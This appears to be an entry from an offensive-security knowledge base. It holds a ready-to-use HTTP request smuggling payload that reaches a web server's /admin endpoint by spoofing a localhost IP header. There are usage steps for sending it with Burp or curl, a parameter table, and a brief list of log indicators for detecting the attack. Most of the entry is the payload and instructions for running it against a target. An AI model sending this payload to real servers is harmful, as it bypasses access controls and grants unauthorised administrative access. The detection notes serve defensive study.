---
id: cfb56788-c771-4a5f-8dab-d33207d2ab37
name: HTTP-Request-Smuggling-Payload-for-Admin-Access
type: code
language: http
verified: true
created_at: '2020-08-12T19:18:57.710693+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - http-request-smuggling
  - payload
validated: true
---

# HTTP-Request-Smuggling-Payload-for-Admin-Access

## Code

```http
0
GET /admin /  HTTP/1.1
x-BkdpqI_Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close
x=1
```

## Description

This HTTP payload smuggles a GET request to the /admin endpoint by mimicking front-end rewriting (e.g., setting x-BkdpqI_Ip to localhost). It tricks the backend into processing it as an internal request, bypassing external access controls.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| x-BkdpqI_Ip | Rewritten IP header from prior observation | 127.0.0.1 |
| Content-Length | Mismatched length for smuggling (fixed at 200) | 200 |
| x | Dummy body parameter | 1 |

## Usage

After observing rewriting in step 2 of the procedure, append or send this payload via Burp or curl to access the admin panel. Substitute the IP based on the target's response.

## Detection

- Logs of /admin access with localhost IP headers from external sources.
- HTTP requests with unusual custom headers like x-BkdpqI_Ip.
- Backend access logs showing unauthenticated internal-like requests.

## Related

- [[procedures/HTTP-Request-Smuggling-to-Reveal-Front-End-Rewriting-and-Access-Admin-Panel]]
- [[tools/Burp-Suite]]
